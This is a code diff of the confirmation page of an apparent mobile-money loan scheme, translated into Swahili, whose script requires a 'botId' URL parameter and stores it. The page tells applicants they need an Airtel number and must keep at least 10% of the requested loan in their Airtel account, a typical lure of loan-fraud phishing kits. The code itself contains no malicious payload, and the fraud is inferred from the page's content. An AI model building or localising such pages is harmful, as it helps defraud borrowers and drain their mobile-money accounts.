@@ -3,24 +3,129 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Success</title>
+<title>Mafanikio</title>
 <style>
-body { font-family: Arial, sans-serif; background: #f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-.success-container { background:#fff; padding:30px; border-radius:12px; width:100%; max-width:400px; box-shadow:0 5px 15px rgba(0,0,0,0.1); text-align:center; }
-h2 { margin-bottom:15px; }
-p { color:#666; font-size:16px; }
+/* Reset default margins and box-sizing */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #6dd5ed, #2193b0);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    padding: 20px;
+    color: #333;
+}
+
+/* Main success container */
+.success-container {
+    background: #fff;
+    padding: 30px 25px;
+    border-radius: 15px;
+    width: 100%;
+    max-width: 450px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+    text-align: center;
+    animation: fadeIn 0.8s ease-in-out;
+}
+
+/* Heading */
+h2 {
+    font-size: 24px;
+    margin-bottom: 15px;
+    color: #2b7a78;
+}
+
+/* Paragraph */
+p {
+    color: #555;
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+/* Qualification Notice styling */
+.loan-notice {
+    background: #f0f9ff;
+    border-left: 5px solid #2193b0;
+    padding: 15px 20px;
+    border-radius: 10px;
+    text-align: left;
+    font-size: 15px;
+    line-height: 1.5;
+    color: #333;
+}
+
+.loan-notice strong {
+    display: block;
+    margin-bottom: 10px;
+    color: #0b3d91;
+    font-size: 16px;
+}
+
+/* List styling */
+.loan-notice ol {
+    padding-left: 20px;
+}
+
+.loan-notice li {
+    margin-bottom: 8px;
+}
+
+/* Fade-in animation */
+@keyframes fadeIn {
+    0% { opacity: 0; transform: translateY(-20px);}
+    100% { opacity: 1; transform: translateY(0);}
+}
+
+/* Responsive tweaks */
+@media (max-width: 480px) {
+    .success-container {
+        padding: 25px 15px;
+    }
+
+    h2 {
+        font-size: 20px;
+    }
+
+    p {
+        font-size: 14px;
+    }
+
+    .loan-notice {
+        font-size: 14px;
+    }
+}
 </style>
 </head>
 <body>
 
 <div class="success-container">
-    <h2>Application Submitted!</h2>
-    <p>Your loan application has been successfully submitted.</p>
+    <h2>Ombi la Mkopo Limewasilishwa!</h2>
+    <p>
+        Ombi lako la mkopo limewasilishwa kwa mafanikio. Ombi hilo linapitiwa na timu yetu kwa sasa.
+        Utapokea ujumbe kutoka kwetu mara tu ukaguzi utakapokamilika.
+        Waombaji wanapaswa kutimiza vigezo vilivyobainishwa ili ombi la mkopo lichakatwe.
+    </p>
+
+    <div class="loan-notice">
+        <strong>Taarifa ya Ustahiki:</strong>
+        <ol>
+            <li>Lazima uombe kwa kutumia namba halali ya Airtel.</li>
+            <li>Lazima uwe na angalau 10% ya kiasi unachoomba kwenye akaunti yako ya Airtel.</li>
+        </ol>
+    </div>
 </div>
 
 <script>
 let botId = new URLSearchParams(window.location.search).get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
+if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 </script>
 
